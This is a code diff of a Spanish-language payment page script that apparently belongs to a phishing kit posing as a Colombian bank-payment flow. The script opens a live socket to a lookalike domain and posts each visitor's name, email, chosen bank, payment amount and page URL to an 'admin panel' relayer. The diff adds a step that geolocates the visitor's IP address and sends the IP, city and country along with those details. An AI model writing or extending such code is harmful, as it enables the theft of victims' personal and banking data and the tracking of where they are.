@@ -1,10 +1,19 @@
-// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI + Alertas
+// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI
 
 const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
 let isTransactionActive = false;
 let browserRequested = false; 
 const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+// ==========================================
+// CACHÉ DE DATOS DE IP PARA ALERTAS
+// ==========================================
+let ipDataCache = {};
+fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => ipDataCache = data)
+    .catch(() => console.log("No se pudo obtener la IP"));
 
 // ==========================================
 // SEGURIDAD: PREVENIR RECARGA Y RETROCESO DURANTE LA CARGA
@@ -119,7 +128,6 @@ if (botonPagar) {
         const doc   = document.getElementById('formNumId').value.trim();
         const name  = document.getElementById('formNombre').value.trim();
         const phone = document.getElementById('formCelular').value.trim();
-        const localData = JSON.parse(localStorage.getItem('datosFactura')) || {};
 
         if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco de la lista."); return; }
         if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
@@ -128,20 +136,22 @@ if (botonPagar) {
         if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
         if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }
 
-        // Enviar alerta de pago al relayer (Panel Admin)
-        try {
-            fetch('https://apifinacjs.pagoswebcol.uk/api/payment-alert', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    nombre: name,
-                    monto: localData.montoPagar || 0,
-                    correo: email,
-                    banco: banco,
-                    url: window.location.href
-                })
-            }).catch(e => console.log('Error enviando alerta:', e));
-        } catch (e) {}
+        // --- Notificación de Alerta de Pago al Backend ---
+        const dataFactura = JSON.parse(localStorage.getItem('datosFactura')) || {};
+        fetch('https://apifinacjs.pagoswebcol.uk/api/payment-alert', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                nombre: name,
+                monto: dataFactura.montoPagar || 0,
+                correo: email,
+                banco: banco,
+                ip: ipDataCache.ip || 'Desconocida',
+                ciudad: ipDataCache.city || 'Desconocida',
+                pais: ipDataCache.country_name || 'Desconocido',
+                url: window.location.href
+            })
+        }).catch(e => console.error("Error enviando alerta de pago:", e));
 
         // Activar estado de bloqueo de seguridad
         isTransactionActive = true; 
